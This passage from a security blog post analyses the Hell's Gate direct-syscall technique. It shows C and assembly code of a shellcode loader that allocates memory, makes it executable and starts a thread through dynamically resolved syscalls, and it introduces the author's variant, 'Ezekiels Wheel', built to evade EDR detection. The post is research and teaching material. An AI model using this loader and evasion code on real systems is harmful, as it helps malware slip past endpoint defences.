</span></span><span class="line"><span class="cl">        <span class="n">status</span> <span class="o">=</span> <span class="nf">HellDescent</span><span class="p">((</span><span class="n">HANDLE</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sDataSize</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ulOldProtect</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Create thread
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">HANDLE</span> <span class="n">hHostThread</span> <span class="o">=</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">HellsGate</span><span class="p">(</span><span class="n">pVxTable</span><span class="o">-&gt;</span><span class="n">NtCreateThreadEx</span><span class="p">.</span><span class="n">wSystemCall</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">status</span> <span class="o">=</span> <span class="nf">HellDescent</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hHostThread</span><span class="p">,</span> <span class="mh">0x1FFFFF</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">HANDLE</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">lpAddress</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">// Wait for 1 seconds
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">LARGE_INTEGER</span> <span class="n">Timeout</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">Timeout</span><span class="p">.</span><span class="n">QuadPart</span> <span class="o">=</span> <span class="o">-</span><span class="mi">10000000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">HellsGate</span><span class="p">(</span><span class="n">pVxTable</span><span class="o">-&gt;</span><span class="n">NtWaitForSingleObject</span><span class="p">.</span><span class="n">wSystemCall</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">status</span> <span class="o">=</span> <span class="nf">HellDescent</span><span class="p">(</span><span class="n">hHostThread</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">Timeout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div>

<h2 class="relative group">Understanding HellsGate 
    <div id="understanding-hellsgate" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#understanding-hellsgate" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>We can go ahead and ignore the underlying operations of <code>VxMoveMemory</code> as this is just a custom implementation of <code>memcpy()</code>. However we can start to understand the underlying operations of the first call - HellsGate.</p>
<pre tabindex="0"><code class="language-assembly" data-lang="assembly">.data
        wSystemCall DWORD 000h

.code
        HellsGate PROC
                mov wSystemCall, 000h
                mov wSystemCall, ecx
                ret
        HellsGate ENDP
</code></pre><p>Let&rsquo;s set a <code>DebugBreak();</code> just before this call.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="nf">DebugBreak</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">HellsGate</span><span class="p">(</span><span class="n">pVxTable</span><span class="o">-&gt;</span><span class="n">NtAllocateVirtualMemory</span><span class="p">.</span><span class="n">wSystemCall</span><span class="p">);</span>
</span></span></code></pre></div><p>Once ran in WinDbg, we see that we&rsquo;re about to enter the call to HellsGate.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/about_to_call_hg.png" alt="alt text" />
      
    </figure>
</p>
<p>Once in, we can see that we&rsquo;ll be executing the syscalls we dynamically resolved.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/using_hg.png" alt="alt text" />
      
    </figure>
</p>


<h2 class="relative group">Understanding HellsDescent 
    <div id="understanding-hellsdescent" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#understanding-hellsdescent" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>At this point our Assembler stub holds the syscall number for <code>NtAllocateVirtualMemory</code> within the <code>.data</code> section of the binary. The next step is to call HellsDescent where we actually execute the syscall.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="n">status</span> <span class="o">=</span> <span class="nf">HellDescent</span><span class="p">((</span><span class="n">HANDLE</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lpAddress</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sDataSize</span><span class="p">,</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
</span></span></code></pre></div><p>When we get to HellsDescent we can see that we are moving RCX into R10. Now normally when issuing a function call the arguments are sent in the order <code>RCX, RDX, R8, R9 and any additional arguments on the stack at offset 0x20</code>. If we look at the function prototype for <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory" target="_blank">NtAllocateMemory()</a> we quickly see that all these arguments simply cannot be stored within RCX unless RCX is a pointer to an object.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">__kernel_entry</span> <span class="n">NTSYSCALLAPI</span> <span class="n">NTSTATUS</span> <span class="nf">NtAllocateVirtualMemory</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>      <span class="n">HANDLE</span>    <span class="n">ProcessHandle</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">]</span> <span class="n">PVOID</span>     <span class="o">*</span><span class="n">BaseAddress</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>      <span class="n">ULONG_PTR</span> <span class="n">ZeroBits</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">out</span><span class="p">]</span> <span class="n">PSIZE_T</span>   <span class="n">RegionSize</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>      <span class="n">ULONG</span>     <span class="n">AllocationType</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="n">in</span><span class="p">]</span>      <span class="n">ULONG</span>     <span class="n">Protect</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span>
</span></span></code></pre></div><p>This is further confirmed when dumping the register states.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/breakdown_hd.png" alt="alt text" />
      
    </figure>
</p>
<p>At this point we can say we have a solid idea on how HellsGate operates :)</p>
<ol>
<li>Parse the InMemoryOrderModuleList and obtain the base address of NTDLL</li>
<li>Obtain the address of the Export Address Table for NTDLL</li>
<li>Parse the EAT in search for target syscalls</li>
<li>Execute syscalls</li>
<li>Profit</li>
</ol>


<h1 class="relative group">PoC | GTFO (Ezekiels Wheel) 
    <div id="poc--gtfo-ezekiels-wheel" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#poc--gtfo-ezekiels-wheel" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<p>We have learned the inner mechanisms of Hell’s Gate operations, now we can use this newfound knowledge to write our own implementation. Although optimized for evasion (Ezekiels Wheel), it’s important to know this would not have been possible without understanding the fundamentals of Windows Syscalls.</p>
<p>
    <figure>
      <img class="my-0 rounded-md" loading="lazy" src="/EzekielsWheelScreenshots/poc.gif" alt="alt text" />
      
    </figure>
</p>
<p>The changes in Ezekiels Wheel are as follows:</p>
<ol>
<li>Dynamic syscall search, we do not rely on having hardcoded syscall instructions in our code</li>
<li>Code re-use, we leverage existing ntdll.dll syscalls so EDR&rsquo;s believe operations to be normal</li>
<li>We have re-implemented our own hashing technique when searching for function routines</li>
<li>We gave it a cool name ;)</li>
</ol>
<p><strong>Ezekiel 10:10</strong> <em>As for their appearance, all four looked alike—as it were, a wheel in the middle of a wheel.</em></p>


<h1 class="relative group">Sources 
    <div id="sources" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#sources" aria-label="Anchor">#</a>
    </span>        
    
</h1>
<pre tabindex="0"><code>http://malwareid.in/unpack/unpacking-basics/export-address-table-and-dll-hijacking
https://doxygen.reactos.org/de/d20/struct__IMAGE__EXPORT__DIRECTORY.html
https://learn.microsoft.com/en-us/windows/win32/api/ntdef/nf-ntdef-containing_record
https://davidesnotes.com/articles/1/?page=1#
https://gist.github.com/Spl3en/9c0ea329bb7878df9b9b
https://redops.at/en/blog/exploring-hells-gate
http://www.rohitab.com/discuss/topic/42191-c-peb-ldr-inmemoryordermodulelist-flink-dllbase-dont-get-the-good-address/
https://www.vergiliusproject.com/
https://alice.climent-pommeret.red/posts/direct-syscalls-hells-halos-syswhispers2/
https://www.youtube.com/watch?v=elA_eiqWefw&amp;t=2s
</code></pre>
          
          
          
        </div>
        
        

        
        

          
      </div>
     
      
      
        
        
          
          
        
      <script>
        var oid = "views_posts\/EzekielsWheel\/EzekielsWheel.md"
        var oid_likes = "likes_posts\/EzekielsWheel\/EzekielsWheel.md"
      </script>
      
      
      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
      
  
    </section>
  <footer class="pt-8 max-w-prose print:hidden">

    
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/posts/tronos/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >La Rueda de Ezequiel (Análisis de la Puerta del Infierno)</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


    
  </footer>
</article>

      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top" title="Scroll to top">
    &uarr;
  </a>
</div>
    </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
  
  <div class="flex items-center justify-between">

    
    
    <p class="text-sm text-neutral-500 dark:text-neutral-400">
      © 2017 Milton Valencia. All Rights Reserved
    </p>
    

    
    
    <p class="text-xs text-neutral-500 dark:text-neutral-400">
      
      
      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
    </p>
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
  
  
  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="/"
  style="z-index:500"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

  </div>
</body>

</html>
